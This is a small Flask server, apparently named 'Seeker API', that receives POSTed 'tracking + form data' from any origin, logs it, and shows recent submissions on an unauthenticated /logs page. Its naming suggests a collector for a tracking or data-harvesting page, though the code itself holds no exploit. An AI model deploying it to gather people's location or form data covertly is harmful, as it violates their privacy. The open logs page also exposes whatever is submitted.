from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from datetime import datetime
import os
import json
from collections import deque

app = Flask(__name__)
CORS(app)

# In-memory storage for recent logs (auto-limits to 5 latest)
recent_logs = deque(maxlen=5)


@app.route("/")
def home():
    """Health check endpoint"""
    return jsonify({
        "message": "Seeker API is live ✅",
        "timestamp": datetime.now().isoformat()
    })


@app.route("/seeker", methods=["POST"])
def seeker():
    """Receive tracking + form data and log it"""
    try:
        data = request.get_json(silent=True)
        if not data:
            data = request.form.to_dict()

        data["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        recent_logs.appendleft(data)

        # --- LIVE LOGS IN RENDER ---
        print("\n📍 --- NEW TRACKING LOG ---")
        print("Timestamp:", data["timestamp"])
        print(json.dumps(data, indent=2))
        print("---------------------------\n")

        return jsonify({
            "status": "success",
            "message": "Data received successfully",
            "data": data
        })

    except Exception as e:
        print("❌ Error:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/logs")
def view_logs():
    """Display recent submissions as a web dashboard"""
    if not recent_logs:
        return "<h3 style='font-family:sans-serif;text-align:center;margin-top:50px;'>No submissions yet 😅</h3>"

    # HTML table template
    html_template = """
    <html>
    <head>
        <title>Recent Tracking Logs</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f6f8fc; color: #202124; }
            h2 { text-align: center; }
            table { border-collapse: collapse; width: 100%; margin-top: 20px; background: #fff; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
            th, td { border: 1px solid #ddd; padding: 10px; text-align: left; font-size: 14px; }
            th { background-color: #1a73e8; color: white; }
            tr:nth-child(even) { background-color: #f2f2f2; }
            .timestamp { color: #555; font-size: 13px; }
        </style>
    </head>
    <body>
        <h2>Recent Tracking Logs (Last {{ count }} submissions)</h2>
        <table>
            <tr>
                <th>Timestamp</th>
                <th>Data</th>
            </tr>
            {% for log in logs %}
            <tr>
                <td class="timestamp">{{ log.timestamp }}</td>
                <td><pre>{{ log.pretty }}</pre></td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """

    formatted_logs = [
        {"timestamp": log.get("timestamp", "—"), "pretty": json.dumps(log, indent=2)}
        for log in list(recent_logs)
    ]

    return render_template_string(html_template, logs=formatted_logs, count=len(formatted_logs))


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
